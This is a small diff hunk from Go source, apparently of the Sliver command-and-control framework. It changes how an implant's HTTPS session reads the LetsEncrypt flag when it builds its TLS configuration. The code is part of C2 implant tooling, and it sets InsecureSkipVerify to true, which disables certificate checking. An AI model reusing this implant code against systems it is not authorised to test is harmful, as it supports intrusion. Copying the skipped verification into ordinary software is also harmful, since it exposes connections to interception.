@@ -96,7 +96,7 @@ func StartSessionHTTPS(c2URI *url.URL, profile *sliverpb.Malleable) (*SliverHTTP
 
 	// Generate the TLS configuration, either mutually authenticated or with LetsEncrypt
 	var tlsConfig *tls.Config
-	if profile.LetsEncrypt {
+	if profile.Credentials.LetsEncrypt {
 		tlsConfig = &tls.Config{InsecureSkipVerify: true} // Trust LetsEncrypt server certificates
 	} else {
 		tlsConfig = cryptography.NewCredentialsTLS(profile.Credentials.CACertPEM,
